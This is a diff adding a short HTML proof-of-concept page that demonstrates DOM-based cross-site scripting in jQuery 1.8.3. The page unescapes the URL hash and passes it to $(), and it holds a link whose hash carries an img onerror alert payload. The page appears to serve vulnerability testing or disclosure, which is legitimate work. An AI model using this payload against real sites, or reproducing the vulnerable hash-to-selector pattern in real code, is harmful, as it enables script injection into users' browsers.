@@ -1,0 +1,16 @@
+<html>
+  <script src="jquery-1.8.3.min.js"></script>
+  <script>
+
+    // this used to work:
+    // $(location.hash);
+
+    // Today, browsers include the pound sign in the hash and encode the entire thing, so the following is needed as a PoC:
+    var removePound = location.hash.substring(1);
+    var unescaped = unescape(removePound);
+    $(unescaped);
+  </script>
+  <body>
+    <a href="#<img src=x onerror=alert('xss')>">load this link in a new tab</a>
+  </body>
+</html>
